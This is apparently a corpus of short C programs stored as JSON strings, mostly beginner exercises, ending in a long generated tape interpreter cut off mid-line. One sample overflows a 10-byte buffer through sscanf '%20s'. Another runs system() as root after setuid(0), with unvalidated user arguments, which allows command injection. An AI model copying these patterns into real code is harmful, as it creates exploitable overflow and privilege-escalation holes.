    "#include <stdio.h>\nint main()\n{\n    printf(\"%d\", '\\0');\n    printf(\"\\n\");\n    printf(\"%d\", '\\6');\n    printf(\"\\n\");\n    printf(\"%d\", '\\10');\n    printf(\"\\n\");\n    printf(\"%d\", '\\8');\n}",
    "#include <stdio.h>\n\nint main()\n{\n  char _arr[26];\n  for(int i = 0; i < 26; i++)\n  {\n    char c = 'a' + i;\n    _arr[i] = c;\n    printf(\"%c\", c);\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv) {\n char buf[10];\n char buf2[10];\n sscanf(\"foooo baaar\", \"%20s %10s\", buf, buf2);\n return 1;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    for (int i = 0; i < 10; i++)\n    {\n        printf(\"%d\\n\", i);\n    }\n}",
    "#include <stdio.h>\ndouble round(double x);\nint main(void) {\n    int temp;\n    double a,b,c,d,e,f,x,y;\n    while (scanf(\"%lf %lf %lf %lf %lf %lf\\n\",&a,&b,&c,&d,&e,&f)!=(-1)) {\n        x = 1.0*(c*e-b*f)/(a*e-b*d);\n        y = 1.0*(a*f-c*d)/(a*e-b*d);\n        printf(\"%.3lf %.3lf\\n\",round(x),round(y));\n    }\n    return 0;\n}\ndouble round(double x) {\n    int temp;\n    if (x>=0) {\n        temp = x*1000+0.5;\n        return 1.0*temp/1000;\n    } else {\n        temp = x*1000-0.5;\n        return 1.0*temp/1000;\n    }\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <math.h>\nint main(){\n char opnum=0;\n int int1=0;\n int int2=0;\n int ans=0;\n setbuf((stdout), 0);\n printf(\"Menu of Operations\\n\"\n   \"------------------\\n\"\n   \"1. +\\n\"\n   \"2. -\\n\"\n   \"3. *\\n\"\n   \"4. /\\n\"\n   \"5. %%\\n\"\n   \"Enter operation number to be executed: \");\n scanf(\"%c\",&opnum);\n printf(\"Enter first integer: \");\n scanf(\"%d\",&int1);\n printf(\"Enter second integer: \");\n scanf(\"%d\",&int2);\n switch(opnum){\n  case '1':\n   ans=int1+int2;\n   printf(\"%d + %d = %d\",int1,int2,ans);\n   break;\n  case '2':\n   ans=int1-int2;\n   printf(\"%d - %d = %d\",int1,int2,ans);\n   break;\n  case '3':\n   ans=int1*int2;\n   printf(\"%d x %d = %d\",int1,int2,ans);\n   break;\n  case '4':\n   ans=int1/int2;\n   printf(\"%d / %d = %d\",int1,int2,ans);\n   break;\n  case '5':\n   ans=int1%int2;\n   printf(\"%d %% %d = %d\",int1,int2,ans);\n   break;\n  default:\n   printf(\"Invalid choice\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n int hc1, hc2, mc1, mc2, sc1, sc2, hdif, mdif, sdif;\n int tiempoSegundosC1, tiempoSegundosC2, diferencia, salidaScanf;\n salidaScanf = scanf(\"%d %d %d\\n%d %d %d\", &hc1, &mc1, &sc1, &hc2, &mc2, &sc2);\n if (salidaScanf != 6)\n  return 1;\n tiempoSegundosC1 = hc1 * 60 * 60 + mc1 * 60 + sc1;\n tiempoSegundosC2 = hc2 * 60 * 60 + mc2 * 60 + sc2;\n diferencia = abs(tiempoSegundosC1 - tiempoSegundosC2);\n sdif = diferencia % 60;\n mdif = diferencia / 60 % 60;\n hdif = diferencia / 60 / 60;\n printf(\"%dh %dm %ds\", hdif, mdif, sdif);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    printf(\"%c\\n\", 'H');\n    printf(\"%c\\n\", 'e');\n    printf(\"%c\\n\", 'l');\n    printf(\"%c\\n\", 'l');\n    printf(\"%c\\n\", 'o');\n    printf(\"%c%c%c%c%c\\n\", 'H','e','l','l','o');\n    printf(\"%s\\n\", \"Hello world!\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(int argc, char** argv)\n{\n    char buffer[32];\n    setuid( 0 );\n    if (argc == 1)\n        system(\"./installer.py\");\n    else if (argc == 2)\n    {\n        snprintf(buffer, sizeof(buffer), \"./installer.py %s\", argv[1]);\n        system(buffer);\n    }\n    else if (argc == 3)\n    {\n        snprintf(buffer, sizeof(buffer), \"./installer.py %s %s\", argv[1], argv[2]);\n        system(buffer);\n    }\n    else\n    {\n        printf(\"Program accepts no more than 3 arguments. \\n\");\n        printf(\"Example ./runscript <config_name> \\n\");\n        printf(\"Example ./runscript --packages <file_with_packages_names.txt> \\n\");\n    }\n    return 0;\n}",
    "#include <stdlib.h>\nint w[2][2];\nvoid f ()\n{\n  int i, j;\n  for (i = 0; i < 2; i++)\n    for (j = 0; j < 2; j++)\n      if (i == j)\n w[i][j] = 1;\n}\nint main ()\n{\n  f ();\n  if (w[0][0] != 1 || w[1][1] != 1 || w[1][0] != 0 || w[0][1] != 0)\n    abort ();\n  exit (0);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n\n\nint main()\n{\n return 0;\n}\nint recvn(int s, char *recvbuf, unsigned int fixedlen)\n{\n int iResult;\n int cnt;\n cnt = fixedlen;\n while (cnt > 0)\n {\n  iResult = recv(s, recvbuf, cnt, 0);\n  if (iResult < 0)\n  {\n   printf(\"error\\n\");\n   return -1;\n  }\n  else if (cnt == 0)\n  {\n   return fixedlen - cnt;\n  }\n  printf(\"%d\\n\", iResult);\n  recvbuf += iResult;\n  cnt -= iResult;\n }\n return fixedlen;\n}",
    "typedef unsigned char UCHAR;\nint main(void)\n{\n  UCHAR i;\n  while(i)\n  {\n     ;\n     i = i & (i-1);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nvoid init(int **);\nvoid fibo(int **);\nint bigadd(int *, int *, int *, int);\nvoid printbig(int *);\nvoid freen(int **);\nint main(void)\n{\n    int n;\n    int *number[5001];\n    init(number);\n    fibo(number);\n    while (scanf(\"%d\", &n) == 1) {\n        printf(\"The Fibonacci number for %d is \", n);\n        printbig(number[n]);\n    }\n    freen(number);\n    return 0;\n}\nvoid init(int **n)\n{\n    int i;\n    for (i = 0; i < 5001; i++) {\n        n[i] = (int *)malloc(sizeof(int) * 1100);\n        memset(n[i], 0, sizeof(int) * 1100);\n    }\n}\nvoid fibo(int **n)\n{\n    int i, digit;\n    n[0][0] = 0;\n    n[1][0] = digit = 1;\n    for (i = 2; i < 5001; i++)\n        digit = bigadd(n[i], n[i - 1], n[i - 2], digit);\n}\nint bigadd(int *n, int *pre, int *ppre, int d)\n{\n    int i;\n    for (i = 0; i < d; i++)\n        n[i] += pre[i] + ppre[i];\n    for (i = 0; i < d; i++)\n        if (n[i] > 9) {\n            n[i] %= 10;\n            n[i + 1]++;\n        }\n    if (n[i] != 0)\n        return i + 1;\n    return i;\n}\nvoid printbig(int *n)\n{\n    int i;\n    i = 1100 - 1;\n    while (n[i] == 0 && i > 0)\n        i--;\n    for (; i > -1; i--)\n        printf(\"%d\", n[i]);\n    printf(\"\\n\");\n}\nvoid freen(int **n)\n{\n    int i;\n    for (i = 0; i < 5001; i++)\n        free(n[i]);\n}",
    "#include <stdio.h>\nint main() {\n    int c;\n    c = getchar() != (-1);\n    printf(\"The character from the test %d.\\n\", c);\n    return 0;\n}",
    "#include<stdio.h>\nint main() {\n float side, area;\n printf(\"Enter the length of the side: \");\n scanf(\"%f\", &side);\n area = side * side;\n printf(\"Area of the square of length %.2f is %.2f.\", side, area);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int Valor, Soma=0;\n    do{\n        printf(\"Digite um valor ou -1 para sair: \");\n        scanf(\"%d\", &Valor);\n        if(Valor!=-1)\n           Soma = Soma + Valor;\n    }while(Valor!=-1);\n    printf(\"Soma: %d\", Soma);\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nvoid panic(char *msg) {\n    fprintf((stderr), \"panic: %s\\n\", msg);\n    exit(-1);\n}\nvoid print_tape(unsigned int *tape, unsigned int *taken_cells, unsigned int size) { for (unsigned int i = 0; i < size; i++) { printf(\"%u \", tape[i]); } printf(\"\\n\"); int unfreed = 0; for (unsigned int i=0; i < 30000; i++) {unfreed += taken_cells[i]; i += taken_cells[i];} printf(\"%d unfreed\\n\", unfreed); }\nunsigned int allocate(unsigned int *tape, unsigned int ptr, unsigned int *taken_cells) {\n    unsigned int requested_mem = tape[ptr];\n    unsigned int consecutive_zero_cells = 0;\n    for (int i=30000 -1; i>0; i--) {\n        if (taken_cells[i] == 0) {\n            consecutive_zero_cells++;\n        } else {\n            consecutive_zero_cells = 0;\n        }\n        if (consecutive_zero_cells >= requested_mem) {\n            unsigned int addr = i;\n            for (int j=0; j<requested_mem; j++) {\n                taken_cells[addr + j] = requested_mem - j;\n            }\n            return addr;\n        }\n    }\n    panic(\"no free memory\");\n}\nvoid free_mem(unsigned int *tape, unsigned int ptr, unsigned int *taken_cells) {\n    unsigned int address = tape[ptr];\n    unsigned int size = taken_cells[address];\n    for (int i=0; i<size; i++) {\n        taken_cells[address+i] = 0;\n        tape[address+i] = 0;\n    }\n}\nvoid zero(unsigned int *tape) {\n    for (int i = 0; i < 30000; i++) tape[i] = 0;\n}\nint main() {\n    unsigned int tape[30000], taken_cells[30000], ref_tape[256];\n    unsigned int ptr = 0, ref_ptr = 0;\n    zero(tape);\n    zero(taken_cells);\nwhile (tape[ptr]) {tape[ptr]-=1;}tape[ptr]+=14;ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}tape[ptr]+=14;ptr-=3;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];scanf(\"%d\", &tape[ptr]);ptr = ref_tape[--ref_ptr];tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr] = allocate(tape, ptr, taken_cells);ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=6;while (tape[ptr]) {tape[ptr]-=1;}ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=7;tape[ptr]+=1;ptr-=6;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}while (tape[ptr]) {tape[ptr]-=1;}ptr+=2;while (tape[ptr]) {tape[ptr]-=1;}ptr-=3;while (tape[ptr]) {ptr+=3;tape[ptr]+=1;ptr-=2;tape[ptr]+=1;ptr-=1;tape[ptr]-=1;}ptr+=1;while (tape[ptr]) {ptr-=1;tape[ptr]+=1;ptr+=1;tape[ptr]-=1;}ptr+=2;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=7;while (tape[ptr]) {ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=6;tape[ptr]-=1;}ptr-=6;while (tape[ptr]) {ptr+=6;tape[ptr]+=1;ptr-=6;tape[ptr]-=1;}while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=7;while (tape[ptr]) {ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=6;tape[ptr]-=1;}ptr-=6;while (tape[ptr]) {ptr+=6;tape[ptr]+=1;ptr-=6;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];free_mem(tape, ptr, taken_cells);while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];tape[ptr]-=1;tape[ptr]+=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;tape[ptr]+=1;ptr+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;tape[ptr]+=1;ptr+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}while (tape[ptr]) {tape[ptr]-=1;}ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=2;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;while (tape[ptr]) {ptr+=1;ptr = ref_tape[--ref_ptr];ptr+=2;tape[ptr]+=1;ptr-=2;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;tape[ptr]-=1;ptr+=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr-=1;}ptr+=1;ptr = ref_tape[--ref_ptr];ptr+=2;while (tape[ptr]) {ptr-=2;ref_tape[ref_ptr++] = ptr; ptr 